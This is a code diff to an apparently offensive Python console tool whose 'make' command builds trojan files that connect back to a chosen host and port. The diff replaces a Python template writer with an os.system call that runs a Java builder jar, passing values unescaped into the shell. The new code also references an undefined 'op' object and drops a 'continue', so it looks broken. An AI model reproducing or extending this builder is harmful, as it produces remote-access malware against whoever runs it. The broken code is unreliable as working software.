@@ -18,7 +18,7 @@ def show_options():
     print(" ++++")
     print()
 
-def console(runpath: str):
+def console(runpath: str, jre: str):
     print("Enter 'help' to get help.")
     print("Enter 'make' to make a new trojan virus file.")
     print("Enter 'exit' to exit")
@@ -39,18 +39,9 @@ def console(runpath: str):
             continue
 
         if command == 'make':
-            port: int = int(input("Enter your trojan virus connect port: "))
-            host: str = input("Enter your trojan virus connect host IP: ")
-            name: str = input("Virus Name: ")
-
-            o = open(runpath+"/../Module/program/python/trojan_virus/trojan_virus.py")
-            with open( os.environ['HOME'] + "/" + name + ".py" , "w") as f:
-                f.write("connect: str=\""+host+"\"\n")
-                f.write("port: int="+str(port))
-                f.write(o.read())
-            f.close()
-            print(" [INFO] "+name+" make in "+os.environ['HOME'] + "/" + name+".py")
-            continue
+            #os.system("cp "+runpath+"/../Module/program/java/trojan_virus/release/app.jar")
+            os.system(jre+" -jar "+runpath+"/../Module/program/java/trojan_virus/release/make.jar "+op.name+" "+op.connect+" "+str(op.port))
+            print(" [INFO] Make Java Trojan Virus OK: "+os.environ['HOME']+"/"+op.name+".jar")
 
         if command.startswith("set port "):
             try :
